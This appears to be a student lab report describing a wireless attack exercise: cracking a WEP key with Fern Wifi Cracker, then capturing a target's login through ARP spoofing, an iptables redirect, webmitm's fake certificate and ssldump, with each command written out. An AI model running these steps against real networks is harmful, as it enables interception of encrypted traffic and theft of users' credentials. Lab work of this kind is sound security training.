(3) A paragraph describing the steps and the tools you used to carry out the attacks
To find the WEP key for the network, we booted Kali Linux, put our wireless card into monitor mode, and used Fern Wifi Cracker to crack the key. To find the username and password for the site the target connects to, we used the following steps:
        1) Enabled packet forwarding
                sudo -s
echo 1 > /proc/sys/net/ipv4/ip_forward
2) Set up the iptables on our kali linux to accept incoming, forwarded ssl connections
                iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT
iptables -A FORWARD -j ACCEPT
        3) Spoofed the posting computer to see us as the router, so that we would receive all of
its connections
                arpspoof -i wlan1 -t 192.168.1.139 192.168.1.1
        4) Then, we used webmitm to generate and respond with a fake certificate to the posting
computer’s requests
                webmitm -d
        5) Lastly, we used ssldump to log all of the incoming connection data
                ssldump -i wlan1 -n -d -k webmitm.crt | tee ssldump.log
The username and password were logged by the webmitm application when the user posted them.
